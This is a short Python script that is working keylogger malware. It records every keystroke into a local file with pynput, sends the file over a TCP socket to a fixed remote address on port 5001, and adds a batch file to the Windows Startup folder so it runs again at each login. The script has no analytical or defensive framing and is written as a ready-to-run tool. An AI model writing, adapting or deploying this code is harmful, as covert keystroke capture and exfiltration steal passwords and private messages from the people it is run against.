from pynput import keyboard

logfile = "info.txt"

def on_press(key):
    try:
        with open(logfile, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(logfile, "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:  
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

    import socket


SERVER_IP = '192.168.179.5'  
PORT = 5001  
FILENAME = "info.txt"  

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, PORT))


with open(FILENAME, "rb") as file:
    while chunk := file.read(4096):
        client_socket.sendall(chunk)

client_socket.close()

import os
import shutil


script_path = os.path.abspath(__file__)


startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")


target_path = os.path.join(startup_folder, "mein_script.bat")


with open(target_path, "w") as bat_file:
    bat_file.write(f'@echo off\npython "{script_path}"\n')
